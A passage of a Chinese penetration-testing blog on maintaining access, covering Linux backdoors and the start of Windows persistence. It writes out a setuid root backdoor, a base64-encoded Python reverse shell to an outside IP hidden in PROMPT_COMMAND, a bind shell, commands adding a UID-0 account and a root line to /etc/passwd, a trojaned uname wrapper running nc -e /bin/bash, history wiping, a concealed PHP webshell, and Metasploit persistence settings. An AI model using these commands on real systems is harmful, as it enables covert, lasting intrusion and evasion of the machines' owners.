脚本（系统环境的初始化，启动的初始化脚本)</span></span><br></pre></td></tr></table></figure><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><h1 id="Setuid-amp-Setgid提权后门"><a href="#Setuid-amp-Setgid提权后门" class="headerlink" title="Setuid &amp; Setgid提权后门"></a>Setuid &amp; Setgid提权后门</h1><p>当我们有机会拿到普通权限的时候，我们可以留下一个这样的后门程序，以后我们就可以直接提权拿到root的权限。</p><ul><li>setuid</li></ul><p><strong>设置使文件在执行阶段具有文件所有者的权限</strong>. 典型的文件是 &#x2F;usr&#x2F;bin&#x2F;passwd. 如果一般用户执行该文件， 则在执行过程中， 该文件可以获得root权限， 从而可以更改用户的密码。</p><ul><li>setgid</li></ul><p>该权限只对目录有效. 目录被设置该位后， 任何用户在此目录下创建的文件都具有和该目录所属的组相同的组（即在相同组的话就具备相同的权限.</p><blockquote><p>back.c</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">gcc back.c -o back</span><br><span class="line"><span class="comment">#添加到bin目录，这样任何用户都能调用back</span></span><br><span class="line"><span class="built_in">cp</span> back /bin/</span><br><span class="line"><span class="comment">#赋予s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行</span></span><br><span class="line"><span class="built_in">chmod</span> u+s /bin/back</span><br><span class="line">ll /bin/back</span><br><span class="line"><span class="comment">#通过后门back程序获取root权限</span></span><br><span class="line">back</span><br><span class="line">back <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><h1 id="PROMPT-COMMAND"><a href="#PROMPT-COMMAND" class="headerlink" title="PROMPT_COMMAND"></a>PROMPT_COMMAND</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Linux Bash Shell提供了一个环境变量：PROMPT_COMMAND，这个变量是在BASH<strong>出现提示符前</strong>执行的命令。即命令提示符</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看PROMPT_COMMAND到底是什么东西，</span></span><br><span class="line">[root@localhost ~]<span class="comment"># echo $PROMPT_COMMAND</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\033]0;%s@%s:%s\007&quot;</span> <span class="string">&quot;<span class="variable">$&#123;USER&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;HOSTNAME%%.*&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;PWD/#$HOME/~&#125;</span>&quot;</span></span><br><span class="line"><span class="comment">#%s占位符，后门变量在此输出</span></span><br><span class="line"><span class="comment">#$&#123;USER&#125;、$&#123;HOSTNAME%%.*&#125;、$&#123;PWD/#$HOME/~&#125;都是变量</span></span><br><span class="line"><span class="comment">#最终输出的东西就是[root@localhost ~]#</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209041443989.png" alt="image-20220904144354523"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看所有环境变量</span></span><br><span class="line"><span class="built_in">env</span></span><br><span class="line"><span class="comment">#查看特定变量(大小写严格)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PROMPT_COMMAND</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$USER</span></span><br><span class="line"><span class="comment">#关于path，就是我们系统调用的命令所在的目录，系统查找的时候就在path的目录下面一个个查找，知道成功调用，先查找/usr/local/sbin，其次/usr/local/bin，再次/usr/sbin，以此类推</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#输出：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span></span><br><span class="line"><span class="comment">#比如查看whoami在哪</span></span><br><span class="line">whereis <span class="built_in">whoami</span></span><br><span class="line"><span class="comment">#输出：whoami: /usr/bin/whoami /usr/share/man/man1/whoami.1.gz</span></span><br></pre></td></tr></table></figure><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><h3 id="后门原理：-python学完后再来"><a href="#后门原理：-python学完后再来" class="headerlink" title="后门原理：(python学完后再来)"></a>后门原理：(python学完后再来)</h3><p>正是因为在执行命令之前都会先运行$PROMPT_COMMAND，所以我们不管执行什么命令都会触发这个变量。这就意味着我们将后门写在这个变量里面，就可以在不知不觉中获得后门</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#base64编码后的python脚本，注意更换ip为自己的ip</span></span><br><span class="line">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;124.223.217.243&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"><span class="comment">#base64编码后</span></span><br><span class="line">aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNC4yMjMuMjE3LjI0MyIsODA4MCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vc2giKQ==</span><br><span class="line"></span><br><span class="line"><span class="comment">#最终命令，通过export修改变量的属性，用于反弹shell</span></span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;lsof -i:8080 &amp;&gt;/dev/null || python -c &quot;</span><span class="built_in">exec</span>(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEyNC4yMjMuMjE3LjI0MyIsODA4MCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vc2giKQ==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="string">&quot; 2&gt;/dev/null &amp;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;lsof -i:8080 &amp;&gt;/dev/null || python -c &quot;</span><span class="built_in">exec</span>(<span class="built_in">ls</span>) 2&gt;/dev/null &amp;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#攻击机开启监听</span></span><br><span class="line"><span class="string">nc 124.223.217.243 1025</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#正向shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#base64编码后的python脚本，本地监听1025端口</span></span><br><span class="line">import socket,os so=socket.socket(socket.AF_INET,socket.SOCK_STREAM) so.bind((<span class="string">&#x27;&#x27;</span>,1025)) so.listen(1) so,addr=so.accept() LJ=False <span class="keyword">while</span> not LJ: data=so.recv(1024) stdin,stdout,stderr,=os.popen3(data) stdout_value=stdout.read()+stderr.read() so.send(stdout_value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#最终命令，本地监听1025端口，用于正向连接，连接此端口</span></span><br><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;</span><span class="built_in">exec</span>(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxvcwpzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uYmluZCgoJycsMTAyNSkpCnNvLmxpc3RlbigxKQpzbyxhZGRyPXNvLmFjY2VwdCgpCkxKPUZhbHNlCndoaWxlIG5vdCBMSjoKCWRhdGE9c28ucmVjdigxMDI0KQoJc3RkaW4sc3Rkb3V0LHN0ZGVyciw9b3MucG9wZW4zKGRhdGEpCglzdGRvdXRfdmFsdWU9c3Rkb3V0LnJlYWQoKStzdGRlcnIucmVhZCgpCglzby5zZW5kKHN0ZG91dF92YWx1ZSkK&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="string">&quot; 2&gt;/dev/null &amp;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#被控机查看建立情况</span></span><br><span class="line">ps -elf|grep python</span><br><span class="line">netstat -anlp |grep 1025</span><br></pre></td></tr></table></figure><h2 id="记录历史操作"><a href="#记录历史操作" class="headerlink" title="记录历史操作"></a>记录历史操作</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=<span class="string">&#x27;msg=$(history 1|&#123; read x y; echo $y; &#125;);user=$(who am i);logger $(date &quot;+%Y-%m-%d%H:%M:%S&quot;):$user[$(whoami)]:`pwd`/:&quot;$msg&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过logger在系统日志中记录相应条目</span></span><br><span class="line"><span class="comment">#补充说明：logger命令 是用于往系统中写入日志，他提供一个shell命令接口到syslog系统模块</span></span><br><span class="line"><span class="comment">#语法：logger [options] [message]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#linux可以通过read赋值写入数据。如：</span></span><br><span class="line"><span class="built_in">read</span> x</span><br><span class="line">lalalala</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$x</span></span><br><span class="line"><span class="comment">#可以通过read来接受输入，再把输入传到对应的变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看执行的命令</span></span><br><span class="line"><span class="built_in">tail</span> -f /var/log/messages</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209050027795.png" alt="image-20220905002731522"></p><h2 id="创建高权限用户"><a href="#创建高权限用户" class="headerlink" title="创建高权限用户"></a>创建高权限用户</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PROMPT_COMMAND=<span class="string">&quot;/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMAND&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#useradd创建用户</span></span><br><span class="line"><span class="comment">#管理员的UID（用户ID）:GID（组ID）都是0，使用用户UID（用户ID）:GID（组ID）都是0，这样用户登录就具有了管理员权限</span></span><br><span class="line"><span class="comment">#直接修改passwd文件也是可以达到目的</span></span><br><span class="line">vim /etc/passwd</span><br><span class="line"><span class="comment">#尝试直接将UID（用户ID）:GID（组ID）改为0，即root权限登录</span></span><br></pre></td></tr></table></figure><h1 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h1><blockquote><p>不仅仅修改uid、gid，也可以创建后门账号</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;print crypt(&quot;alvin&quot;,&quot;adgfagm&quot;).&quot;\n&quot;&#x27;</span></span><br><span class="line">adt5Dy6c9PSDw</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;weblogic1:adt5Dy6c9PSDw:0:0:root:/root:/bin/bash&quot;</span>&gt;&gt;/etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment">#用户名weblogic1，密码：alvin</span></span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209050053093.png" alt="image-20220905005301882"></p><h1 id="uname后门"><a href="#uname后门" class="headerlink" title="uname后门"></a>uname后门</h1><blockquote><p>类似alias的后门</p><p><a href="https://github.com/iamckn/backdoors">https://github.com/iamckn/backdoors</a></p></blockquote><blockquote><p><a href="https://github.com/iamckn/backdoors/blob/master/bd_uname.sh">bd_uname.sh</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#uname</span></span><br><span class="line"><span class="comment">#-------------------------</span></span><br><span class="line"><span class="built_in">touch</span> /usr/local/bin/uname</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt;&gt; /usr/local/bin/uname</span></span><br><span class="line"><span class="string">#!/bin/bash</span></span><br><span class="line"><span class="string">#正向shell的命令,有四种可以选择，</span></span><br><span class="line"><span class="string">nc.traditional -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#socat TCP4-Listen:3177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#socat SCTP-Listen:1177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#perl -MIO -e&#x27;$s=new IO::Socket::INET(LocalPort=&gt;1337,Listen=&gt;1);while($c=$s-&gt;accept())&#123;$_=&lt;$c&gt;;print $c `$_`;&#125;&#x27; 2&gt;/dev/null &amp;</span></span><br><span class="line"><span class="string">#实际执行的命令</span></span><br><span class="line"><span class="string">/bin/uname \$@</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/uname</span><br></pre></td></tr></table></figure><blockquote><p> 上面脚本简洁的看就是执行下面两个命令：<code>nc -l -v -p 4444 -e /bin/bash 2&gt;/dev/null</code>和<code>/bin/uname $@</code></p><p>#正向shell的命令</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">nc -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp; /bin/uname <span class="variable">$@</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入ip加端口连接即可</span></span><br><span class="line">nc ip 4444</span><br></pre></td></tr></table></figure><h1 id="Linux隐藏技巧"><a href="#Linux隐藏技巧" class="headerlink" title="Linux隐藏技巧"></a>Linux隐藏技巧</h1><h2 id="简单文件隐藏"><a href="#简单文件隐藏" class="headerlink" title="简单文件隐藏"></a>简单文件隐藏</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> .mingy.py</span><br><span class="line"><span class="built_in">ls</span> -la</span><br></pre></td></tr></table></figure><h2 id="隐藏权限"><a href="#隐藏权限" class="headerlink" title="隐藏权限"></a>隐藏权限</h2><p>chattr命令可以给文件加锁，防止被删除，我们也可以将它利用起来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr +i 1.txt</span><br><span class="line"><span class="comment">#加锁后即使是root也没办法删除</span></span><br><span class="line"><span class="comment">#恢复</span></span><br><span class="line">chattr -i 1.txt</span><br></pre></td></tr></table></figure><h2 id="隐藏历史记录"><a href="#隐藏历史记录" class="headerlink" title="隐藏历史记录"></a>隐藏历史记录</h2><blockquote><p>拿到shell以后，开启无痕模式，禁用命令历史记录功能</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> +o <span class="built_in">history</span></span><br></pre></td></tr></table></figure><blockquote><p>恢复</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -o <span class="built_in">history</span></span><br></pre></td></tr></table></figure><h2 id="删除历史命令"><a href="#删除历史命令" class="headerlink" title="删除历史命令"></a>删除历史命令</h2><p>删除100行以后的操作命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&quot;100,<span class="variable">$d</span>&quot;</span> .bash_history</span><br></pre></td></tr></table></figure><h2 id="linux系统下的特性：-r"><a href="#linux系统下的特性：-r" class="headerlink" title="linux系统下的特性：\r"></a>linux系统下的特性：<code>\r</code></h2><blockquote><p> 通过cat查看不到\r字符前面的内容，但是vim编辑文件可以看到</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&lt;?=\`\$_POST[cmd]\`?&gt;\r&lt;?=&#x27;mingy&#x27;;?&gt;&quot;</span> &gt;/var/www/html/1ndex.php</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208231338946.png" alt="image-20220823133808817"></p><p>可正常请求webshell</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限维持 </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x30 - Windows权限维持</title>
      <link href="/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2022-08-21-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x30-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持简介"><a href="#权限维持简介" class="headerlink" title="权限维持简介"></a>权限维持简介</h1><p>为了保证获取到的目标权限不会因为漏洞的修复而丢失，攻击者通常会在目标上安装一个后门，来保证对目标的持久化控制。</p><h1 id="Meterpreter权限维持"><a href="#Meterpreter权限维持" class="headerlink" title="Meterpreter权限维持"></a>Meterpreter权限维持</h1><p>meterpreter中的权限维持技术有两种类型：</p><ul><li>persistence（注册表后门）</li></ul><blockquote><p>在有杀软的环境下，一般修改注册表项会被杀软监控，杀软都会盯着这些敏感注册表项，所以修改注册表的方式，在有杀软的环境下不建议使用~动静大。</p></blockquote><ul><li>metsvc 的后门（服务后门）</li></ul><h2 id="Persistence（已弃用）"><a href="#Persistence（已弃用）" class="headerlink" title="Persistence（已弃用）"></a>Persistence（已弃用）</h2><blockquote><p>虽然弃用了，但是msf上还是有啦</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Persistence 模块是先上传 vbs脚本，然后执行 vbs脚本修改注册表<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> 从而完成自启动。（注册表中写入的是vbs脚本路径，方便自启动vbs脚本）</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>开机自启动，但是容易被杀软查杀。</p><h3 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run persistence -h</span><br><span class="line">-A：自动启动一个匹配的漏洞/多/处理程序来连接到代理</span><br><span class="line">-X：开机启动，注册表位置：    HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-U：当前用户登录后自启动，注册表位置：    HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-S：作为服务启动，注册表位置：    HKLM\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">-T：选择要使用的可执行模板</span><br><span class="line">-L：后门传到远程主机的位置默认为 %TEMP%</span><br><span class="line">-P：使用的Payload，默认windows/meterpreter/reverse_tcp，该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行</span><br><span class="line">-i：设置反向连接间隔时间，单位为秒，每隔五秒重启</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -U -X -i 5 -P windows/x64/meterpreter/reverse_tcp -p 4444 -r 192.168.78.117</span><br></pre></td></tr></table></figure><blockquote><p>解释一下这条命令具体干了上面：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240046198.png" alt="image-20220824004626002"></p><p>上图中可以看到生成了一个文件，我们在本地查看一下</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240045868.png" alt="image-20220824004558722"></p><p>可以看到这个文件执行了两个命令，一个是清除了vbs，一个是删除了注册表项（这是在做痕迹清除的事情）</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240051115.png" alt="image-20220824005131983"></p><p>可以看到向目标主机写入vbs脚本内容，并执行</p><p>执行后运行了一个进程，该进程会与msf通信生成一个新的session</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240052263.png" alt="image-20220824005228117"></p><p>运行 PID为4816 修改注册表项自启动~~~</p><p>可以用SysinternalsSuite工具集中的autorun方便的查看变化~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240107737.png" alt="image-20220824010723561" style="zoom: 33%;" /></blockquote><p>当使用 run persistence 进行持久化时默认文件上传的远程路径会推送到 %TEMP% 目录下(“C:\Users\AppData\Local\Temp&quot;)，当用户重启时， persistence 持久化就可能会出错。可以通过 -L  参数指定vbs脚本上传的位置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -i 5 -p 4444 -r 192.168.78.117 -L C:\\Windows\\System32</span><br></pre></td></tr></table></figure><p>该命令脚本注册自启动注册表位置：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><h2 id="Metsvc模块（已弃用）"><a href="#Metsvc模块（已弃用）" class="headerlink" title="Metsvc模块（已弃用）"></a>Metsvc模块（已弃用）</h2><p>metsvc  模块是开机自启动的<strong>服务型后门</strong>，msf集成的权限持久化模块，通过服务启动，服务名是 meterpreter ，监听端口是31337。（Windows系统下 服务一般是随着系统启动而启动）不好用-再试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -h   # 模块信息</span><br><span class="line">run metsvc -A   # 启动服务（自动启动 exploit/multi/handler 连接服务）</span><br><span class="line">run metsvc -r   # 卸载服务（文件必须手动删除）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br></pre></td></tr></table></figure><blockquote><p>执行后干了什么：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240113410.png" alt="image-20220824011334231"></p><p>上传文件 启动服务 安装服务 生成会话~~这样子一个过程</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208240115662.png" alt="image-20220824011547504"></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211328268.png" alt="image-20220821132831052" style="zoom: 33%;" /><h2 id="exploit-x2F-windows-x2F-local-x2F-persistence"><a href="#exploit-x2F-windows-x2F-local-x2F-persistence" class="headerlink" title="exploit&#x2F;windows&#x2F;local&#x2F;persistence"></a>exploit&#x2F;windows&#x2F;local&#x2F;persistence</h2><p>在新版的msf中以上两个模块都已被弃用，功能都包含到了此模块中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/persistence</span><br><span class="line">set session 1</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELAY     10               yes       持久性有效载荷不断重新连接回来的延迟（秒）。</span><br><span class="line">EXE_NAME                   no        将在目标主机上使用的有效载荷的文件名（默认为%RAND%.exe）。</span><br><span class="line">PATH                       no        写入有效载荷的路径（默认为%TEMP%）。</span><br><span class="line">REG_NAME                   no        在目标主机上调用注册表值进行持久化的名称（默认为%RAND%）。</span><br><span class="line">SESSION   1                yes       运行该模块的会话</span><br><span class="line">STARTUP   USER             yes       持久性有效载荷的启动类型。(接受：USER, SYSTEM)</span><br><span class="line">VBS_NAME                   no        目标主机上的VBS持久化脚本要使用的文件名（默认为%RAND%）。</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211330638.png" alt="image-20220821133003386" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211330078.png" alt="image-20220821133018914" style="zoom:50%;" /><h2 id="Autorunscript"><a href="#Autorunscript" class="headerlink" title="Autorunscript"></a>Autorunscript</h2><p>获取shell的时候自动执行持续化脚本，可以被 Autorunscript 执行的命令目录在 metasploit&#x2F;scripts&#x2F;meterpreter 。、</p><p>一上线就立马做权限维持~~</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#persistence</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.78.117</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript persistence -r 192.168.78.117 -p 5556 -U -X -i 30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#metsvc</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.78.117</span><br><span class="line">set LPORT 5555</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript metsvc -A</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h1 id="系统工具替换后门-IFEO映像劫持"><a href="#系统工具替换后门-IFEO映像劫持" class="headerlink" title="系统工具替换后门-IFEO映像劫持"></a>系统工具替换后门-IFEO映像劫持</h1><blockquote><p>以前喜欢用的方法</p><p>参考：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/96504762">IFEO映像劫持在实战中的使用</a></li></ul></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows  的辅助功能提供了额外的选项（屏幕键盘，放大镜，屏幕阅读等），可以帮助特殊人士更容易地使用操作系统。然而，这种功能可能会被<strong>滥用于</strong>在**&#x3D;&#x3D;启用 RDP&#x3D;&#x3D;  并&#x3D;&#x3D;获得 Administrator  权限&#x3D;&#x3D;的主机<strong>上实现持久化访问。这种技术会</strong>接触磁盘，或者需要修改注册表来执行远程存储的 payload<strong>。<br>涉及到的注册表项为 IFEO（Image File Execution Options镜像文件执行选项） ，</strong>默认是只有管理员和local system有权读写修改。** </p><blockquote><ul><li>前提：</li></ul><blockquote><ul><li>启用 RDP,获得了远程桌面</li></ul><blockquote><p>并不需要我们一直拥有远程桌面，只要他开启了远程桌面的服务，我们即使密码错误也可以到达下图中的界面，只要到达此界面，我们就可以触发劫持的后门程序~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208241921771.png" alt="image-20220824192140582" style="zoom:33%;" /></blockquote><ul><li>获得 Administrator  权限的主机</li></ul></blockquote><ul><li>注册表添加操作：</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add去查看命令参数</span><br><span class="line"> /v       所选项之下要添加的值名称。</span><br><span class="line"> /t       RegKey 数据类型</span><br><span class="line">           [ REG_SZ    | REG_MULTI_SZ | REG_EXPAND_SZ |</span><br><span class="line">             REG_DWORD | REG_QWORD    | REG_BINARY    | REG_NONE ]</span><br><span class="line">           如果忽略，则采用 REG_SZ。</span><br><span class="line">     /d       要分配给添加的注册表 ValueName 的数据。</span><br><span class="line"> /f       不用提示就强行覆盖现有注册表项。     </span><br></pre></td></tr></table></figure></blockquote><ul><li>涉及注册表项：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</span><br></pre></td></tr></table></figure></blockquote><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>当我们按照常理运行属于IFEO列表的文件的时候,会执行相关的选项参数，这里我们主要利用的参数是 <strong>&#x3D;&#x3D;debugger&#x3D;&#x3D;</strong> 